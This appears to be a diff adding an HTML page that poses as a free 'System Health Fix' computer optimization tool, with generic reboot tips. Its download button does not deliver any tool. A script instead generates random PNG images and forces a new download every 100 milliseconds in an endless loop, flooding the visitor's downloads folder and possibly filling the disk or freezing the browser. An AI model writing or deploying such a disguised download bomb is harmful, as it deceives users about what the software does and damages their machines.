@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KOLANGfree Services</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Roboto', sans-serif;
+            background-color: #FF0000;
+            color: #fff;
+            text-align: center;
+            line-height: 1.6;
+        }
+
+        header {
+            background-color: #FF0000;
+            color: #ffffff;
+            padding: 30px 0;
+            font-weight: 700;
+            font-size: 36px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 100px auto 40px;
+            padding: 30px;
+            border-radius: 10px;
+            background: white;
+            box-shadow: 0 4px 25px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            font-size: 40px;
+            margin: 20px 0;
+            color: #0056b3;
+        }
+
+        .bio,
+        .reboot-section {
+            background-color: #fafbfc;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            margin: 20px 0;
+            text-align: left;
+            transition: transform 0.3s, background-color 0.3s;
+        }
+
+        .bio:hover,
+        .reboot-section:hover {
+            background-color: #f1f1f1;
+            transform: translateY(-2px);
+        }
+
+        h2 {
+            font-size: 28px;
+            margin-bottom: 15px;
+            color: #007BFF;
+        }
+
+        p, li {
+            font-size: 16px;
+            margin-bottom: 10px;
+            line-height: 1.6;
+            color: #555555;
+        }
+
+        ul {
+            list-style-type: disc;
+            padding-left: 20px;
+        }
+
+        .download-button {
+            background-color: #28a745;
+            color: #ffffff;
+            padding: 15px 35px;
+            border-radius: 5px;
+            font-size: 22px;
+            font-weight: bold;
+            margin: 30px 0;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
+            transition: background-color 0.3s, transform 0.3s, box-shadow 0.3s;
+        }
+
+        .download-button:hover {
+            background-color: #000;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        footer {
+            margin-top: 30px;
+            font-size: 13px;
+            color: #777777;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+                margin: 80px auto 20px;
+            }
+
+            h1 {
+                font-size: 28px;
+            }
+
+            h2 {
+                font-size: 24px;
+            }
+
+            .download-button {
+                font-size: 18px;
+                padding: 10px 20px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header>KOLANGfree. Services</header>
+
+    <div class="container">
+        <h1>Optimize Your Computer's Performance</h1>
+
+        <div class="bio">
+            <h2>About This Tool</h2>
+            <p>The Ultimate System Health Fix tool is designed to maximize your computer's performance by diagnosing issues, optimizing speed, and enhancing overall functionality. Our goal is to provide you with the reliable support you need to keep your system running smoothly.</p>
+        </div>
+
+        <div class="reboot-section">
+            <h2>Rebooting Your Device When It's in Danger</h2>
+            <p>If your device is acting erratically or is at risk, here are some methods to safely reboot:</p>
+            <ul>
+                <li><strong>Windows:</strong> Click on the Start menu, select 'Power', and choose 'Restart'. If unresponsive, hold the power button for 10 seconds until it turns off, then press it again to turn it back on.</li>
+                <li><strong>Mac:</strong> Click on the Apple logo in the top left corner, and select 'Restart'. For unresponsive systems, press and hold the power button until it shuts down, then press it again to reboot.</li>
+                <li><strong>Mobile Devices:</strong> Typically, hold the power button until the power menu appears. Choose 'Restart'. If frozen, hold the power and volume down buttons simultaneously until it resets.</li>
+                <li><strong>Tablets:</strong> Press and hold the power button to restart.</li>
+            </ul>
+        </div>
+
+        <button class="download-button" id="downloadButton">Start fighting and protecting your computer!</button>
+    </div>
+
+    <footer>
+        <p>&copy; 2024 KOLANGfree. All rights reserved.</p>
+    </footer>
+
+    <script>
+        document.getElementById("downloadButton").onclick = function () {
+            let index = 0;
+
+            const startDownloading = () => {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 200; // Width of the image
+                canvas.height = 200; // Height of the image
+
+                // Fill canvas with a random color
+                ctx.fillStyle = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+                // Adding some text to the image
+                ctx.fillStyle = 'white';
+                ctx.font = '20px Arial';
+                ctx.fillText(`Image #${index + 1}`, 10, 30);
+
+                const dataUrl = canvas.toDataURL('image/png');
+
+                const link = document.createElement('a');
+                link.href = dataUrl;
+                link.download = `image_${index++}.png`;
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+
+                setTimeout(startDownloading, 100);
+            };
+
+            startDownloading();
+        };
+    </script>
+</body>
+
+</html>
